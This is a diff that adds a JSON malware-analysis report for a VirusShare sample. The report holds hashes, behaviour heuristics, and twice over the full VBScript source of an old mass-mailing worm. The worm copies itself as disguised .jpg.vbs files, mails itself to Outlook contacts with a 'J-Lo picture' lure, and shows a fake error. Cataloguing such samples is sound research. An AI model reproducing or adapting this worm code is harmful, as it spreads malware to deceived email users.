@@ -1,0 +1,69 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Chr": "May attempt to obfuscate specific str",
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file",
+            "RegRead": "May read registry keys",
+            "Shell": "May run an executable file or a system command",
+            "WINDOWS": "May enumerate application windows",
+            "WScript.Shell": "May run an executable file or a system command",
+            "open": "May open a file"
+        },
+        "macro": "set fso=CreateObject(\"Scripting.FileSystemObject\")\nset c=fso.GetFile(WScript.ScriptFullName)\nc.Copy(\"c:\"&\"\\LOPEZ.jpg.vbs\")\nc.Copy(\"c:\\WINDOWS\"&\"\\J-Lo.jpg.vbs\")\nset write1=fso.CreateTextFile(\"C:\"&\"\\READ.txt\")\nwrite1.WriteLine \"Vbs Lopez 1.0\"\nwrite1.Close\non error resume next\nset ws=CreateObject(\"WScript.Shell\")\nset look=ws.RegRead(\"HKEY_CURRENT_USER\\Software\\JeniferLopez\")\nif (look <> \"Finished\") Then\nset outapp=WScript.CreateObject(\"Outlook.Application\")\nset mapi = outapp.GetNameSpace(\"MAPI\")\nfor lists = 1 to mapi.AddressLists.Count\nset lsts = mapi.AddressLists(lists)\nx = 1\nrecips = lsts.AddressEntries(x)\nset email = outapp.CreateItem(0)\nemail.Recipients.Add(recips)\nemail.Subject = \"Fwd: J-Lo picture!\"\nemail.Body = \"Hi,\" & vbcrlf & \"Don't show anyone else this picture!\"\nemail.Attachments.Add \"c:\\WINDOWS\\J-Lo.jpg.vbs\"\nemail.DeleteAfterSubmit = True\nemail.Send\nws.RegWrite \"HKEY_CURRENT_USER\\Software\\JeniferLopez\",\"Finished\"\nMsgBox(\"Error:\" & Chr(13) & \"Could not open file\")\nNext\nEnd If"
+    },
+    "filename": "VirusShare_207486d1302602714133ed92e1c22e39",
+    "filesize": 1025,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "207486d1302602714133ed92e1c22e39",
+        "sha1": "164968e5d25bad1c0ea8988f86b4567380a921dc",
+        "sha256": "fb7662815a95062c56a6dc281dc821f1d64f1b0cb1b9f9ba0fe7fff6d176de39"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "set fso=CreateObject(\"Scripting.FileSystemObject\")",
+            "set c=fso.GetFile(WScript.ScriptFullName)",
+            "c.Copy(\"c:\"&\"\\LOPEZ.jpg.vbs\")",
+            "c.Copy(\"c:\\WINDOWS\"&\"\\J-Lo.jpg.vbs\")",
+            "set write1=fso.CreateTextFile(\"C:\"&\"\\READ.txt\")",
+            "write1.WriteLine \"Vbs Lopez 1.0\"",
+            "write1.Close",
+            "on error resume next",
+            "set ws=CreateObject(\"WScript.Shell\")",
+            "set look=ws.RegRead(\"HKEY_CURRENT_USER\\Software\\JeniferLopez\")",
+            "if (look <> \"Finished\") Then",
+            "set outapp=WScript.CreateObject(\"Outlook.Application\")",
+            "set mapi = outapp.GetNameSpace(\"MAPI\")",
+            "for lists = 1 to mapi.AddressLists.Count",
+            "set lsts = mapi.AddressLists(lists)",
+            "x = 1",
+            "recips = lsts.AddressEntries(x)",
+            "set email = outapp.CreateItem(0)",
+            "email.Recipients.Add(recips)",
+            "email.Subject = \"Fwd: J-Lo picture!\"",
+            "email.Body = \"Hi,\" & vbcrlf & \"Don't show anyone else this picture!\"",
+            "email.Attachments.Add \"c:\\WINDOWS\\J-Lo.jpg.vbs\"",
+            "email.DeleteAfterSubmit = True",
+            "email.Send",
+            "ws.RegWrite \"HKEY_CURRENT_USER\\Software\\JeniferLopez\",\"Finished\"",
+            "MsgBox(\"Error:\" & Chr(13) & \"Could not open file\")",
+            "Next",
+            "End If"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.332468",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
